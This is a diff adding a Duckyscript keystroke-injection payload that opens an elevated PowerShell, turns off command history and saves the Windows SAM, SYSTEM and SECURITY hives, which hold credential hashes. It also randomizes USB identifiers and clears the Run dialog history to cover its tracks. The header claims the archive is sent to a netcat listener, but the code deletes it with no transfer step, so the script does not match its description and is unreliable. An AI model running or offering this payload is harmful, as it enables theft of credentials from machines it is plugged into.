@@ -1,0 +1,37 @@
+REM Title: Duckyscript Windows Hive Dump
+REM Author: kipair
+REM Description: This script launches PowerShell as Administrator, pauses PowerShell command history, creates a local backup of the SAM, SYSTEM, and SECURITY hives,
+REM              compresses the backup files into a .ZIP, sends the .ZIP file to a netcat listener, clears Windows Run dialogue box history, and then exits PowerShell.
+
+REM Change IP and PORT variables according to the netcat listener.
+DEFINE #IP 10.0.0.86
+DEFINE #PORT 4444
+
+REM Randomizes device identifiers.
+VID_RANDOM
+PID_RANDOM
+MAN_RANDOM
+PRO_RANDOM
+SER_RANDOM
+
+CAPSLOCK_DISABLE
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT Y
+DELAY 2000
+STRINGLN_BLOCK
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+Compress-Archive -Path 'C:\sam.save', 'C:\system.save', 'C:\security.save' -DestinationPath 'C:\loot.zip'
+Remove-Item -Path C:\loot.zip
+Remove-Item -Path C:\sam.save
+Remove-Item -Path C:\system.save
+Remove-Item -Path C:\security.save
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+exit
+END_STRINGLN
